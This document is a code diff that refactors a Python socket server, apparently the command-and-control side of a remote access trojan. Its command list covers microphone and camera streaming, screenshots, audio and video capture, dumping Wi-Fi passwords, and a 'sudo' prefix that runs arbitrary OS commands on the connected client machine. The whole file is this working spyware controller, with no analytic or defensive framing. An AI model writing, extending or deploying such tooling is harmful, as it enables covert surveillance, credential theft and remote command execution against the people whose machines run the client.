@@ -1,62 +1,74 @@
-# server.py
-
 import socket
-import threading
+import shlex
+import json
 
-HOST = '127.0.0.1'  # Standard loopback interface address (localhost)
-PORT = 65432        # Port to listen on (non-privileged ports are > 1023)
+HOST = '127.0.0.1'
+PORT = 65432
+VALID_COMMANDS = (
+    "help", "sudo", "screanshort", "stream_mic", "stream_camera",
+    "capture_video", "capture_audio", "get_wifi_passwords",
+    "get_wifi_profiles", "get_wifi_password_all"
+)
 
-valid_commands = ("help","get_wifi_profiles", "get_wifi_password_all","screanshort", "stream_camera", "stream_mic", "capture_video", "capture_audio", "get_wifi_passwords")
-
-def server_listener():
+def start_server():
     """
-    Starts the server listener to accept client connections.
+    Starts the server to listen for client connections.
     """
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
         server_socket.bind((HOST, PORT))
         server_socket.listen(1)
-        print(f"[*] Server is listening on {HOST}:{PORT}")
+        print(f"[*] Server listening on {HOST}:{PORT}")
         client_socket, client_address = server_socket.accept()
-        print(f"[*] Connected to {client_address[0]}:{client_address[1]}")
-    return server_socket, client_socket, client_address
+        print(f"[*] Connection established with {client_address[0]}:{client_address[1]}")
+        return client_socket, client_address
 
-def handle_client(client_socket, client_address):
+def handle_command(command):
     """
-    Handles the client connection and processes commands.
+    Processes the input command and determines its type.
+    """
+    command_parts = shlex.split(command)
+    if not command_parts:
+        return None, None
 
-    Args:
-        client_socket: The socket object for the client.
-        client_address: A tuple containing the client's IP and port.
+    command_type = command_parts[0].lower()
+    return command_type, command_parts[1:]
+
+def handle_client(client_socket):
+    """
+    Manages client communication and command execution.
     """
     try:
         while True:
-            command = input("Shell> ").strip().lower()
-            if command in ("exit", "quit"):
-                print("You are about to terminate this active connection.")
-                confirmation = input("Do you really want to terminate the connection (yes/no) [default: no]? ").strip().lower()
-                if confirmation == "yes":
+            command = input("Enter a command > ").strip()
+            if not command:
+                continue
+
+            command_type, command_args = handle_command(command)
+
+            if command_type in ("exit", "quit"):
+                confirm = input("Terminate connection (yes/no)? ").strip().lower()
+                if confirm == "yes":
                     client_socket.sendall(b"exit")
-                    print(f"[*] Terminated the connection to {client_address[0]}:{client_address[1]}")
+                    print("[*] Connection terminated.")
                     break
-                elif confirmation == "no" or confirmation == "":
-                    continue
-            elif command in valid_commands:
-                print(f"Executing command: {command}")
-                client_socket.sendall(command.encode())  # Example of sending the command to the client
-                response = client_socket.recv(1024).decode()
-                print(response)
+
+            elif command_type in VALID_COMMANDS:
+                client_socket.sendall(command.encode())
+                response = client_socket.recv(4096).decode()
+                print(f"Response:\n{response}\n")
+
             else:
-                print(f"Invalid command: {command}. Use 'help' to see available commands.")
+                print("Use 'help' to list valid commands with discriptions.")
+                print(f'''Invalid command: '{command}'. Try with 'sudo' infront of the command to execute is as an OS command.''')
     finally:
         client_socket.close()
 
-
 def main():
     """
-    The main entry point for the server application.
+    Entry point for the server application.
     """
-    server_socket, client_socket, client_address = server_listener()
-    handle_client(client_socket, client_address)
+    client_socket, _ = start_server()
+    handle_client(client_socket)
 
 if __name__ == "__main__":
     main()
